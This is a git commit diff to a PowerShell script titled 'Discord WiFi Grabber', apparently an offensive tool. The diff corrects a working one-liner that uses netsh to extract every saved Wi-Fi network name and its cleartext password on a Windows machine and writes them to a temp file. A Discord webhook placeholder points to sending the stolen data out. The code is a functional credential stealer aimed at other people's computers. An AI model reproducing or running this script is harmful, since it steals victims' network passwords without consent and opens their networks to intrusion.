12e420f4ba5d2a90508421c575b3389f17e7514e
beigeworm <93350544+beigeworm@users.noreply.github.com>
2023-07-03 15:28:15 +0000

    Update Discord WiFi Grabber.ps1

--- Discord WiFi Grabber.ps1
+++ Discord WiFi Grabber.ps1
@@ -16,7 +16,7 @@ USAGE
 $whuri = "DISCORD_WEBHOOK_HERE"
 #==================================================================
 
-outfile='';$a=0;$ws=(netsh wlan show profiles) -replace ".*:\s+";foreach($s in $ws){if($a -gt 1 -And $s -NotMatch " policy " -And $s -ne "User profiles" -And $s -NotMatch "-----" -And $s -NotMatch "<None>" -And $s.length -gt 5){$ssid=$s.Trim();if($s -Match ":"){$ssid=$s.Split(":")[1].Trim()}$pw=(netsh wlan show profiles name=$ssid key=clear);$pass="None";foreach($p in $pw){if($p -Match "Key Content"){$pass=$p.Split(":")[1].Trim()
+$outfile='';$a=0;$ws=(netsh wlan show profiles) -replace ".*:\s+";foreach($s in $ws){if($a -gt 1 -And $s -NotMatch " policy " -And $s -ne "User profiles" -And $s -NotMatch "-----" -And $s -NotMatch "<None>" -And $s.length -gt 5){$ssid=$s.Trim();if($s -Match ":"){$ssid=$s.Split(":")[1].Trim()}$pw=(netsh wlan show profiles name=$ssid key=clear);$pass="None";foreach($p in $pw){if($p -Match "Key Content"){$pass=$p.Split(":")[1].Trim()
 $outfile+="SSID: $ssid >> Password: $pass`n"}}}$a++;}
 
 $outfile | Out-File -FilePath "$env:temp\systeminfo.txt" -Encoding ASCII -Append
